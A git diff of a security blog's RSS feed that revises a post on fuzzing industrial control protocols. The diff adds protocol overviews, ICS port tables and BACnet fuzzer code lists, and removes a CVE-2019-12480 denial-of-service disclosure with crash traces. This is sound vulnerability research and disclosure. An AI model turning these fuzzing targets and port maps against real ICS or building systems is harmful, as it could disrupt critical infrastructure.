@@ -5,15 +5,17 @@
     <description>M</description>
     <link>https://1modm.github.io/</link>
     <atom:link href="https://1modm.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 15 Apr 2020 00:17:38 +0100</pubDate>
-    <lastBuildDate>Wed, 15 Apr 2020 00:17:38 +0100</lastBuildDate>
-    <generator>Jekyll v3.8.5</generator>
+    <pubDate>Wed, 15 Jul 2020 00:01:43 +0100</pubDate>
+    <lastBuildDate>Wed, 15 Jul 2020 00:01:43 +0100</lastBuildDate>
+    <generator>Jekyll v4.1.1</generator>
     
       <item>
         <title>Fuzzing ICS protocols</title>
-        <description>&lt;p&gt;ICS stands for Industrial Control Systems, is a generic term used to describe control systems and their instrumentation, used for controlling and monitoring industrial processes. ICS basically integrates hardware, software and their network connectivity for running and supporting critical infrastructure. ICS systems get data from remote sensors and send commands to the machinery for the appropriate actions to take.&lt;/p&gt;
+        <description>&lt;p&gt;&lt;strong&gt;ICS&lt;/strong&gt; stands for Industrial Control Systems, the term is very generic and is commonly used to describe control systems and their instrumentation, usually for controlling and monitoring industrial processes. ICS basically integrates hardware, software and their network connectivity for running and supporting critical infrastructure. ICS systems get data from remote sensors and send commands to the machinery for the appropriate actions to take.&lt;/p&gt;
 
-&lt;p&gt;Typical ICS components:&lt;/p&gt;
+&lt;p&gt;In this post we are going to focus in BACnet and modbus protocols.&lt;/p&gt;
+
+&lt;h2 id=&quot;typical-ics-components&quot;&gt;Typical ICS components&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Supervisory Control and Data Acquisition (SCADA)&lt;/li&gt;
@@ -28,45 +30,179 @@
   &lt;li&gt;Remote Terminal Units (RTU)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;the following protocols are widely used:&lt;/p&gt;
+&lt;h2 id=&quot;typical-ics-protocols-used&quot;&gt;Typical ICS protocols used&lt;/h2&gt;
+
 &lt;ul&gt;
   &lt;li&gt;
-    &lt;p&gt;CIP
- The Common Industrial Protocol (CIP) is a protocol created by the ODVA company for automating industrial processes. CIP comprises a set of services and messages for control, security, synchronization, configuration, information, and so forth which can be integrated into Ethernet networks and into  the Internet.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;RS-232&lt;/li&gt;
-  &lt;li&gt;RS-485&lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Modbus
- Modbus is one of the oldest industrial control protocols. It was introduced in 1979 using serial communications to interact with PLCs. It is open-source and freely distributed and can be built by anyone into their equipment. Modbus work in the application layer, which permits different physical uses for transport layer. It  provides communication in client-server mode among differing sorts of equipment connected through different technologies on lower layers, which include but not limited to, the TCP/IP protocol layer. Modbus has several security concerns – lack of authentication, lack of encryption, lack of message checksum and lack of broadcast suppression.&lt;/p&gt;
+    &lt;p&gt;The Common Industrial Protocol (&lt;strong&gt;CIP&lt;/strong&gt;) is a protocol created by the ODVA company for automating industrial processes. CIP comprises a set of services and messages for control, security, synchronization, configuration, information, and so forth which can be integrated into Ethernet networks and into  the Internet.&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;DNP3
-DNP3 stands for Distributed Network Protocol. It was developed in 1993 and is widely used in the USA and Canada. It is only sparsely used in Europe, because  there are alternatives such as IEC-60870-5-101 or IEC-60870-5-104. It operates at the application, data link and transport layers; thus, it is a three-layer protocol.&lt;/p&gt;
+    &lt;p&gt;&lt;strong&gt;Modbus&lt;/strong&gt; is one of the oldest industrial control protocols. It was introduced in 1979 using serial communications to interact with PLCs. It is open-source and freely distributed and can be built by anyone into their equipment. Modbus work in the application layer, which permits different physical uses for transport layer. It  provides communication in client-server mode among differing sorts of equipment connected through different technologies on lower layers, which include but not limited to, the TCP/IP protocol layer. 
+ Modbus has several security concerns: Lack of authentication, lack of encryption, lack of message checksum and lack of broadcast suppression.&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;HART&lt;/li&gt;
-  &lt;li&gt;TASE 2.0 and ICCP&lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;PROFIBUS and PROFINET
- Profibus(an  acronym  from PROcessFieldBUS)is  astandardforcommunicationthroughFieldbus promoted in 1989 by the German Department of Education and Researchand used by Siemens.It  is  basedon serial communicationsby cable  (RS-485,  MBP)or optical fibercable.&lt;/p&gt;
+    &lt;p&gt;&lt;strong&gt;DNP3&lt;/strong&gt; stands for Distributed Network Protocol. It was developed in 1993 and is widely used in the USA and Canada. It is only sparsely used in Europe, because  there are alternatives such as IEC-60870-5-101 or IEC-60870-5-104. It operates at the application, data link and transport layers; thus, it is a three-layer protocol.&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;FOUNDATION Fieldbus&lt;/li&gt;
-  &lt;li&gt;BACnet&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;HART&lt;/strong&gt; (Highway Addressable Remote Transducer) is a hybrid analog+digital industrial automation open protocol. HART is widely used in process and instrumentation systems ranging from small automation applications up to highly sophisticated industrial applications.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;TASE&lt;/strong&gt; (Telecontrol Application Service Element) 2.0 is also known as &lt;strong&gt;ICCP&lt;/strong&gt; (Inter Control Center Protocol) or International Electrotechnical Commission (IEC) 60870-6, but they are more commonly referred to as ICCP. Since different vendors had their own custom and proprietary protocols, there was a need for a common protocol for communication and data exchange between different control centers. Keeping this in mind, ICCP/TASE 2.0 was designed. Unlike Modbus, which was designed for serial communication, ICCP has been designed specifically for communication over LAN (Local Area Network) and WAN (Wide Area Network). ICCP is used in communication between different control centers, power pools, sub-stations, other utilities and non-utility generators.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Profibus&lt;/strong&gt; (PROcessFieldBUS acronym) is a standard for communication through Fieldbus promoted in 1989 by the German Department of Education and Researchand used by Siemens. It is based on serial communications by cable (RS-485,  MBP) or optical fibercable. Has two variants, Profibus DP (for decentralized peripherals) and Profibus PA (for process automation).&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Profinet&lt;/strong&gt;  is a standard based on  Profibus that adopts Ethernet as its physical interface for connections rather than RS485. It offers  the  complete  TCP/IP functionality for data transmission. Profinet is oriented toward reliability and real-time communications, together with usability.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;BACnet&lt;/strong&gt; was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;OPC&lt;/strong&gt; (OLE for  process control) is not an industrial communications protocol, but rather an operational framework for communications in process control systems based on Windows that use object linking and embedding (OLE).&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;-tabla-puertos-ics&quot;&gt;!!!!! TABLA PUERTOS ICS&lt;/h2&gt;
+&lt;h2 id=&quot;standard-protocol-ports&quot;&gt;Standard Protocol Ports&lt;/h2&gt;
 
-&lt;p&gt;Is there an increase of interest and focus in Cybersecurity referring to Industrial Control Systems (ICSs), not only PLCs, HMIs, RTUs and sensors, there are other elements like chillers, industrial refrigeration, fire detection, fire suppression, energy storage, HVACs, etc. which can be managed through the BACnet protocol.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Protocol&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Ports&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;BACnet/IP&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;UDP/47808&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DNP3&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/20000, UDP/20000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;EtherCAT&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;UDP/34980&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Ethernet/IP&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/44818, UDP/2222, UDP/44818&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;FL-net&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;UDP/55000 to 55003&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Foundation Fieldbus HSE&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/1089 to 1091, UDP/1089 to 1091&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ICCP&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/102&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Modbus TCP&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/502&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OPC UA Binary&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Vendor Application Specific&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OPC UA Discovery Server&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/4840&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OPC UA XML&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/80, TCP/443&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PROFINET&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/34962 to 34964, UDP/34962 to 34964&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ROC PLus&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP 4000&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;p&gt;Usually are referenced under the term “Intelligent Buildings”, however, their use is neither exclusive to them nor is it something relatively new. The building management is given by the acronym BMS, Building Management System and must be distinguished between residential buildings or industrial buildings. In general, BMS systems integrate a set of subsystems in charge of lighting, fire, alarm, elevator, ventilation, temperature, etc. control systems. Although many of them are common to both environments we cannot say that they are similar since the applications and scope are different.&lt;/p&gt;
+&lt;h2 id=&quot;vendor-specific-ports&quot;&gt;Vendor Specific Ports&lt;/h2&gt;
 
-&lt;p&gt;These systems must communicate with each other for their own operation and management. One of the protocols used is BACnet (Buiding Automation Control Network) a Data Communication Protocol for Building Automation and Control Networks approved by the ASHRAE Standards Committee. In June 1987 the American Society of Heating, Refrigeration and Air-conditioning Engineers (ASHRAE) set up the Standard Project Committee 135 (SPC 135) to develop a data communications protocol for Building, Automation and Control Networks (BACnet). As well as becoming a US national standard in 1995 (ASHRAE/ANSI 135-1995) and then updated in 2001, in many countries it also became an ISO standard 16484-5 in January 2003. BACnet also became a European standard CEN TC 247 in 2003.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Vendor&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Product or Protocol&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Ports&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ABB&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Ranger 2003&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/10307, TCP/10311, TCP/10364 to 10365, TCP/10407, TCP/10409 to 10410, TCP/10412, TCP/10414 to 10415, TCP/10428, TCP/10431 to 10432, TCP/10447, TCP/10449 to 10450, TCP/12316, TCP/12645, TCP/12647 to 12648, TCP/13722, TCP/13724, TCP/13782 to 13783, TCP/38589, TCP/38593, TCP/38600, TCP/38971, TCP/39129, TCP/39278&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Emerson / Fisher&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;ROC Plus&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/4000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS FoxApi&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/55555&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS AIMAPI&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/45678&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS Informix&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/1541&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Iconics&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Genesis32 GenBroker (TCP)&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/18000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Johnson Controls&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Metasys N1&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/11001&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Johnson Controls&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Metasys BACNet&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;UDP/47808&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OSIsoft&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;PI Server&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/5450&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Siemens&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Spectrum Power TG&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/50001 to 50016, TCP/50018 to 50020, UDP/50020 to 50021, TCP/50025 to 50028, TCP/50110 to 50111&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SNC&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;GENe&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TCP/38000 to 38001, TCP/38011 to 38012, TCP/38014 to 38015, TCP/38200, TCP/38210, TCP/38301, TCP/38400, TCP/38700, TCP/62900, TCP/62911, TCP/62924, TCP/62930, TCP/62938, TCP/62956 to 62957, TCP/62963, TCP/62981 to 62982, TCP/62985, TCP/62992, TCP/63012, TCP/63027 to 63036, TCP/63041, TCP/63075, TCP/63079, TCP/63082, TCP/63088, TCP/63094, TCP/65443&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Telvent&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;OASyS DNA&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;UDP/5050 to 5051, TCP/5052, TCP/5065, TCP/12135 to 12137, TCP/56001 to 56099&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;p&gt;BACnet has  been  designed  specifically  to  meet  the  communication  needs  of  building  automation  and  control  systems  for  applications  such  as  heating,  ventilating,  and  air-conditioning control, lighting control, access control, and fire detection systems. The BACnet protocol provides mechanisms by which computerized equipment of arbitrary function may exchange information, regardless of the particular building service it performs. As a result, the BACnet protocol may be used by head-end computers, general-purpose direct digital controllers, and application specific or unitary controllers with equal effect.&lt;/p&gt;
-
-&lt;p&gt;Like many others, each BACNet device is a combination of hardware and software, like devices working as controllers, gateways or user interfaces. Each of them has a unique identifier or instance number that identifies and differentiates them from those existing in the network apart from others with information regarding the inputs and outputs that these devices monitors and controls.&lt;/p&gt;
-
-&lt;p&gt;In BACnet we can find 3 differentiated concepts, Objects, Properties and Services, all the information contained within a BACnet device is ordered as objects, which makes it a protocol oriented precisely to this, to objects. Each “Object” represents a component of the device itself or a set of information that can be requested by another through other protocols or layers such as Ethernet, IP, RS-485, etc. The protocol defines more than 50 types of objects for the most common uses.&lt;/p&gt;
+&lt;h1 id=&quot;fuzzing-bacnet&quot;&gt;Fuzzing BACnet&lt;/h1&gt;
 
 &lt;h2 id=&quot;bacnet&quot;&gt;BACnet&lt;/h2&gt;
 
@@ -122,605 +258,737 @@ DNP3 stands for Distributed Network Protocol. It was developed in 1993 and is wi
 
 &lt;p&gt;&lt;img src=&quot;public/images/apdu-pcap.png&quot; alt=&quot;apdu&quot; title=&quot;apdu&quot; /&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;testbed&quot;&gt;Testbed&lt;/h2&gt;
+&lt;h2 id=&quot;in-fuzzing-we-trust&quot;&gt;In fuzzing we trust&lt;/h2&gt;
 
-&lt;p&gt;If we want to create our own lab and scenario we can install the OpenSource BACnet Protocol Stack and test the connectivity to BACnet port, we need:&lt;/p&gt;
+&lt;p&gt;First of all we need to understand and known how the protocol that we want to fuzz works. With this in mind in the next lines will be provided some examples on how to fuzz certain operations that are used in this case by BACnet. The examples provided below are written to be used with &lt;a href=&quot;https://github.com/nccgroup/fuzzowski&quot;&gt;Fuzzowski&lt;/a&gt; a Network Protocol Fuzzer forked from &lt;a href=&quot;https://github.com/jtpereyda/boofuzz&quot;&gt;BooFuzz&lt;/a&gt; (which is a fork of &lt;a href=&quot;https://github.com/OpenRCE/sulley&quot;&gt;Sulley&lt;/a&gt;), so the next examples can be translated easily to boofuzz.&lt;/p&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;A BACNet port open UDP 47808&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;In BACnet the devices have a Device ID (Device Object Identifier) which is used in a BACnet network as the unique identifier of a specific device. The Device ID for each device must be unique on the entire BACnet network. Device Instance can be in the range of 0 to 4194304. So first of all we need to modify and set the BACnet Device ID in the &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/bacnet/bacnet.py&quot;&gt;BACnet fuzzer&lt;/a&gt; that we can found in the Fuzzowski repository&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install -y build-essential
-$ sudo apt-get install subversion
-$ svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacnetServer
-$ cd bacnetServer
-$ make clean all
-$ demo/server/bacserv
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DeviceID = 12345 # BACnet Device ID
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h1 id=&quot;cve-2019-12480-bacnet-protocol-stack-segmentation-fault-leading-to-denial-of-service&quot;&gt;CVE-2019-12480: BACnet Protocol Stack Segmentation fault leading to denial of service&lt;/h1&gt;
+&lt;p&gt;Also some Codes, Functions and Services or Types have been defined in the BACnet fuzzer to be used by the methods defined:&lt;/p&gt;
 
-&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BVLC_Function_Code = [
+    '\x00',  # BVLC Result
+    '\x01',  # Write Broadcast Distribution Table 
+    '\x02',  # Read Broadcast Distribution Table 
+    '\x03',  # Read Broadcast Distribution Table ACK 
+    '\x04',  # Forwarded-NPDU
+    '\x05',  # Register Foreign Device
+    '\x0a',  # Original-Unicast-NPDU
+    '\x0b',  # Original-Broadcast-NPDU
+    '\x0c'   # Secure-BVLL 
+]
 
-&lt;ul&gt;
-  &lt;li&gt;20/05/2019 Discovered vulnerability and developed baseline proof-of-concept.&lt;/li&gt;
-  &lt;li&gt;24/05/2019 Reported to https://sourceforge.net/p/bacnet/bugs/61/&lt;/li&gt;
-  &lt;li&gt;28/05/2019 Anonymous reported similar issue to https://sourceforge.net/p/bacnet/bugs/62/&lt;/li&gt;
-  &lt;li&gt;29/05/2019 Updated disclosure, sent notes and exploits. Asked for a CVE and coordinated disclosure.&lt;/li&gt;
-  &lt;li&gt;19/07/2019 Updated CVE Description CVE-2019-12480.&lt;/li&gt;
-  &lt;li&gt;20/08/2019 Public disclosure&lt;/li&gt;
-&lt;/ul&gt;
+Confirmed_Service_Choices = [
+    '\x05',  # Subscribe COV
+    '\x0c',  # Read Property
+    '\x0e',  # Read Property Multiple
+    '\x0f',  # Write Property 
+    '\x10',  # Write Property Multiple
+    '\x11',  # Device Communication Control
+    '\x14'   # Reinitialize Device
+]
 
-&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;BACnet Protocol Stack through 0.8.6 has a segmentation fault leading to denial of service in BACnet APDU Layer because a malformed DCC in AtomicWriteFile, AtomicReadFile and DeviceCommunicationControl services. An unauthenticated remote attacker could cause a denial of service (bacserv daemon crash) because there is an invalid read in bacdcode.c during parsing of alarm tag numbers.&lt;/p&gt;
-
-&lt;h2 id=&quot;cve&quot;&gt;CVE&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12480&quot;&gt;NVD CVE-2019-12480 Details&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Score: 7.5 High&lt;/li&gt;
-  &lt;li&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/li&gt;
-  &lt;li&gt;CWE: CWE-125&lt;/li&gt;
-  &lt;li&gt;cpe:2.3:a:bacnet_protocol_stack_project:bacnet_protocol_stack:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt; Up to (including) 0.8.6&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;bug-references-and-exploit&quot;&gt;Bug References and Exploit&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/61/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/61/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/62/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/62/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&quot;&gt;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;fixes&quot;&gt;Fixes&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3220&quot;&gt;https://sourceforge.net/p/bacnet/code/3220&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3223&quot;&gt;https://sourceforge.net/p/bacnet/code/3223&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3224&quot;&gt;https://sourceforge.net/p/bacnet/code/3224&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3225&quot;&gt;https://sourceforge.net/p/bacnet/code/3225&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;faults-analysis&quot;&gt;Faults analysis&lt;/h1&gt;
-
-&lt;p&gt;During some fuzzing tests were detected a segmentation fault in the following services:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Device Communication Control&lt;/li&gt;
-  &lt;li&gt;Atomic Read File&lt;/li&gt;
-  &lt;li&gt;Atomic Write File&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;fault-in-device-communication-control-service&quot;&gt;Fault in Device Communication Control Service&lt;/h2&gt;
-
-&lt;p&gt;Stack and GDB output for segmentation fault in the Device Communication Control service:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
-Signal si_signo: 11 Signal si_addr: 2154041910
-Nearby code:
-   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
-   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
-   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
-   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
-   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
-=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
-   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
-   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
-   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
-   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
-Stack trace:
-#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  1 decode_is_context_tag at 0x413974 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  2 dcc_decode_service_request at 0x418428 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  3 handler_device_communication_control at 0x41e079 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Description: Access violation on source operand
-Short description: SourceAv (19/22)
-Hash: 0c6889881a5d7caa77aa0dbc2027317f.b3c82754609555d1d0273757f67cf6ca
-Exploitability Classification: UNKNOWN
-Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
-Other tags: AccessViolation (21/22)
-
---- Info Frame ---
-
-Stack level 0, frame at 0x7fffffffdc50:
- rip = 0x413760 in decode_tag_number; saved rip 0x413974
- called by frame at 0x7fffffffdc80
- Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
- Saved registers:
-  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
-
---- Info Registers ---
-
-rax            0x12 18
-rbx            0x7fffffffdc5f   140737488346207
-rcx            0x11 17
-rdx            0x0  0
-rsi            0x0  0
-rdi            0x7fffffffd700   140737488344832
-rbp            0x80641236   0x80641236
-rsp            0x7fffffffdc30   0x7fffffffdc30
-r8             0x1  1
-r9             0x7ffff7a5b14d   140737348219213
-r10            0x65626d756e5f6761   7305521896678713185
-r11            0x0  0
-r12            0x7fffffffdd08   140737488346376
-r13            0xc  12
-r14            0x7fffffffdce0   140737488346336
-r15            0x80641236   2154041910
-rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
-eflags         0x10206  [ PF IF RF ]
-cs             0x33 51
